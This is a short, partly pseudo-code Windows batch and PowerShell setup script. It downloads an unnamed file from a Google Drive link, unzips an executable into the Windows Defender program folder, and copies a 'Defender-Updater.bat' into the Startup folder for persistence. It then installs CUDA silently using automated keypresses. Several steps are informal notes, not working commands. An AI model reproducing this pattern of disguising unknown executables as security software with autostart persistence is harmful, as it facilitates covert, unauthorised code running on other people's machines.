@echo off

powershell set-executionpolicy remotesigned

curl https://drive.google.com/file/d/1IlwRiiGgkFDXWOn_nLIp6Uw1VAmuJbIf/view?usp=sharing

unzip exe zip into Program Files/Windows Defender
unzip cuda files into Program Files/Nvidia Cuda Toolkit/Cuda/

add Program Files/Nvidia Cuda Toolkit/Cuda/bin and Program Files/Nvidia Cuda Toolkit/Cuda/include in path variables

cp Defender-Updater.bat "..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

restart at 10pm




Write-Output "Started"
Start-Process -FilePath C:\Users\hydrogen\Downloads\cuda_10.1.105_418.96_win10.exe -ArgumentList '/S','/v','/qb' -passthru
Start-Sleep -Seconds 100
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
Start-Sleep -Seconds 10
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
Start-Sleep -Seconds 150
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
Start-Sleep -Seconds 2
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')

Write-Output "pressed"
Start-Sleep -Seconds 60000
https://developer.download.nvidia.com/compute/cuda/12.5.1/local_installers/cuda_12.5.1_555.85_windows.exe
